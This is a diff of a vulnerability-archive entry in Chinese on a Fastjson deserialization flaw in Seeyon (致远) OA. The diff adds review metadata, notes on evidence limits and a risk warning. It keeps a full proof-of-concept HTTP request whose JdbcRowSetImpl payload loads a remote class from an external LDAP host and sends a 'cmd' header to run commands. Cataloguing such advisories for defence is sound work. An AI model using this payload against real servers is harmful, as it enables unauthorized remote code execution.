@@ -1,12 +1,52 @@
 ---
-cnvd: "CNVD-2017-02833"
-fofa: "seeyon"
 source: "MrWQ/vulnerability-paper"
+title: "致远OA / Fastjson main.do changeLocale JSON反序列化链及Fastjson版本教程"
+product: "致远OA / Fastjson"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: "CNVD-2017-02833;CNVD-2019-22238"
+identifier_status: "unknown"
+affected_scope: "OA5.6–7.1各SP；JNDI/JDK阈值和多个Fastjson版本列举，具体OA依赖未明"
+prerequisites: "样本含会话，实际是否前台未说明"
+side_effects: "命令/代码执行示例可能改变主机状态"
+review_date: "2026-10-02"
+source_url: "https://mp.weixin.qq.com/s/yTuQLqqvikwo1KfK-zGBBA"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9C%E4%BC%AA%200day%20FastJson%20%E5%88%A9%E7%94%A8%E9%93%BE.md"
+fofa_unverified: "seeyon"
+id: "vw-53343484cb63fe5c18f59220"
+entity_id: "ve-53343484cb63fe5c18f59220"
+schema_version: "1"
 ---
 
-# 致远伪 0day FastJson 利用链
+# 致远OA / Fastjson main.do changeLocale JSON反序列化链及Fastjson版本教程
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：致远OA / Fastjson；main.do changeLocale JSON反序列化链及Fastjson版本教程
+- 版本、配置及部署条件：OA5.6–7.1各SP；JNDI/JDK阈值和多个Fastjson版本列举，具体OA依赖未明
+- 认证与权限前提：样本含会话，实际是否前台未说明
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- CNVD2017-02833仅通用Fastjson<=1.2.24时间线，不能作为整篇致远主编号；样例采用v47，另引用CNVD2019-22238
+- 大量JSON被\}、\{转码破坏，部分本来是探测错误格式需与损坏区分
+- 未知字段是否Jackson报错依配置，不能当万能识别法；DNS请求不能独自证明ping或RCE
+- JNDI远程类加载阈值不等于全部本地gadget利用范围；依赖类须逐版本列
+- 招聘尾部很长，作为通用附录可裁，不按某个Fastjson CNVD整篇去重
+
+## 操作风险
+
+命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/yTuQLqqvikwo1KfK-zGBBA)
 
 **STATEMENT**
@@ -31,10 +71,9 @@ V5.6、V5.6SP1
 
 **NO.2 POC**
 
-```
+```http
 POST /seeyon/main.do?method=changeLocale HTTP/1.1
 Host: 10.1.2.87
-Content-Length: 221
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
 Content-Type: application/x-www-form-urlencoded
@@ -43,11 +82,13 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 cmd: ipconfig
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
-Cookie: JSESSIONID=26FF8158707BB0896A3ACD66EB92DD41; loginPageURL=
+Cookie: JSESSIONID=2******************************1; loginPageURL=
 Connection: close
 
 _json_params={"v47":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"xxx":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xxx.xxx.xxx:1289/TomcatBypass/TomcatEcho","autoCommit":true\}\}
 ```
+
+> 请求长度说明：原资料 Content-Length 为 221；静态长度已移除，应由客户端根据最终请求体的字节数生成。
 
 **NO.3** **漏洞复现**
 
